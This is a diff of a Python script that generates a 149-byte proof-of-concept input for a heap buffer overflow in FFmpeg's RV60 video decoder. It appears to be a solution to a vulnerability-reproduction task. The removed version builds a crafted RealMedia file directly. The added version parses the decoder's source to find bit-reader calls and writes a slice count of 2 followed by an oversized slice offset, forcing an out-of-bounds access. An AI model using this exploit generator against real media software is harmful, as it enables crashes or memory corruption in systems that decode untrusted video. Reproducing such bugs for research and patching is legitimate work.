@@ -1,56 +1,127 @@
-import struct
+import tarfile
+import re
 
 class Solution:
     def solve(self, src_path: str) -> bytes:
-        """
-        Generate a PoC that triggers the heap buffer overflow vulnerability in avcodec/rv60dec.
-        The PoC mimics a minimal RealMedia (.rm) file containing an RV60 stream.
-        """
+        c_code = ""
+        try:
+            with tarfile.open(src_path, 'r') as tar:
+                for member in tar.getmembers():
+                    if member.name.endswith('libavcodec/rv60dec.c'):
+                        f = tar.extractfile(member)
+                        if f:
+                            c_code = f.read().decode('utf-8', errors='ignore')
+                        break
+        except Exception:
+            return b'\x00' * 149
         
-        # 1. RMF Header (18 bytes)
-        # Signature (.RMF), Version(0), HeaderSize(18), Flags(0), NumHeaders(4)
-        rmf = struct.pack('>4sIIHI', b'.RMF', 0, 18, 0, 4)
+        if not c_code:
+            return b'\x00' * 149
+
+        # Locate rv60_decode_frame body
+        idx = c_code.find("int rv60_decode_frame")
+        if idx == -1:
+            idx = c_code.find("rv60_decode_frame")
         
-        # 2. MDPR Chunk (82 bytes) - Media Properties
-        # This chunk defines the stream type and codec.
-        mime = b'video/x-pn-realvideo'
+        if idx != -1:
+            body_start = c_code.find("{", idx)
+            if body_start != -1:
+                # Capture a large chunk for analysis
+                code_chunk = c_code[body_start:body_start+4000]
+            else:
+                code_chunk = c_code
+        else:
+            code_chunk = c_code
+
+        # Regex to capture get_bits calls, identifying variable assignment, function, and bit count
+        pattern = re.compile(r'(?:(\w+)\s*=\s*)?(get_bits_long|get_bits|get_bits1|get_ue_golomb)\s*\(\s*&?\w+(?:,\s*(\d+))?\s*\)')
         
-        # Codec Data (16 bytes) -> Passed to decoder extradata
-        # Structure: Size(4), FourCC(4), Width(2), Height(2), Bpp(2), Pad(2)
-        # FourCC 'RV60' ensures the vulnerable decoder is selected.
-        codec_data = struct.pack('>I4sHHH2s', 16, b'RV60', 320, 240, 24, b'\x00\x00')
+        matches = list(pattern.finditer(code_chunk))
         
-        # MDPR Body Fixed Fields (32 bytes)
-        # Ver(2), Stream(2), MaxBit(4), AvgBit(4), MaxPkt(4), AvgPkt(4), Start(4), Pre(4), Dur(4)
-        mdpr_fixed = struct.pack('>HHIIIIIII', 0, 0, 0, 0, 0, 0, 0, 0, 0)
+        bits = []
+        found_slice = False
+        slice_bits_len = 8
+        offset_bits_len = 32
         
-        # MDPR Body Variable Fields
-        # NameLen(1), MimeLen(1), MimeStr, TypeSpecLen(4), TypeSpecData
-        mdpr_vars = struct.pack('BB', 0, len(mime)) + mime + struct.pack('>I', len(codec_data)) + codec_data
+        for m in matches:
+            var = m.group(1)
+            func = m.group(2)
+            arg = m.group(3)
+            
+            n = 0
+            val_to_write = 0
+            
+            if func == 'get_bits1':
+                n = 1
+                val_to_write = 0
+            elif func == 'get_ue_golomb':
+                # ue(0) maps to bit '1'
+                bits.append(1)
+                continue
+            else:
+                n = int(arg) if arg else 0
+                val_to_write = 0
+            
+            # Check if this is the slice count read
+            is_slice = False
+            if var and ('slice' in var) and ('num' in var or 'cnt' in var or 'count' in var or var == 'slices'):
+                is_slice = True
+            
+            if is_slice:
+                found_slice = True
+                slice_bits_len = n
+                # Set slice count to 2 to enable loop and second offset
+                val_to_write = 2
+                
+                # Heuristic: Look ahead for offset bit width
+                rest = code_chunk[m.end():]
+                off_m = pattern.search(rest)
+                if off_m:
+                    func_next = off_m.group(2)
+                    arg_next = off_m.group(3)
+                    if func_next != 'get_ue_golomb' and arg_next:
+                        offset_bits_len = int(arg_next)
+                
+                # Write slice count
+                for i in range(n-1, -1, -1):
+                    bits.append((val_to_write >> i) & 1)
+                
+                break # Stop processing header, proceed to offsets
+            else:
+                # Write default (0) for other header fields
+                for i in range(n-1, -1, -1):
+                    bits.append((val_to_write >> i) & 1)
         
-        mdpr_body = mdpr_fixed + mdpr_vars
-        mdpr = b'MDPR' + struct.pack('>I', len(mdpr_body) + 8) + mdpr_body
+        if found_slice:
+            # Write Offset 0: value 0
+            for i in range(offset_bits_len-1, -1, -1):
+                bits.append(0)
+            
+            # Write Offset 1: Large value to trigger overflow/OOB
+            # Use a large value that fits in offset_bits_len
+            # e.g., if 32 bits, 0x1FFFFFFF is large enough to exceed 149 byte buffer
+            large = (1 << (min(offset_bits_len, 30))) - 1
+            for i in range(offset_bits_len-1, -1, -1):
+                bits.append((large >> i) & 1)
         
-        # 3. DATA Chunk (49 bytes)
-        # This chunk contains the actual media packet.
+        # Convert bits to bytes
+        byte_arr = bytearray()
+        cur = 0
+        cnt = 0
+        for b in bits:
+            cur = (cur << 1) | b
+            cnt += 1
+            if cnt == 8:
+                byte_arr.append(cur)
+                cur = 0
+                cnt = 0
+        if cnt > 0:
+            byte_arr.append(cur << (8 - cnt))
+            
+        res = bytes(byte_arr)
         
-        # Payload (22 bytes)
-        # Designed to trigger the vulnerability in slice initialization.
-        # We use high values (0xFF) to simulate large slice offsets or counts 
-        # that cause the "initialize slice gb" logic to fail or calculate invalid sizes.
-        payload = b'\xFF' * 8 + b'\x00' * 14
+        # Pad to 149 bytes
+        if len(res) < 149:
+            res += b'\x00' * (149 - len(res))
         
-        # Packet Header (9 bytes content + 2 bytes length prefix)
-        # Ver(2), Stream(2), Timestamp(4), Flags(1)
-        pkt_hdr_content = struct.pack('>HHIB', 0, 0, 0, 2)
-        
-        # Packet length field includes the size of header content + payload
-        pkt_len = len(pkt_hdr_content) + len(payload)
-        packet = struct.pack('>H', pkt_len) + pkt_hdr_content + payload
-        
-        # DATA Chunk Body: NumPkts(4), NextData(4) + Packet
-        data_body = struct.pack('>II', 1, 0) + packet
-        data = b'DATA' + struct.pack('>I', len(data_body) + 8) + data_body
-        
-        # Total size: 18 + 82 + 49 = 149 bytes
-        return rmf + mdpr + data
+        return res[:149]
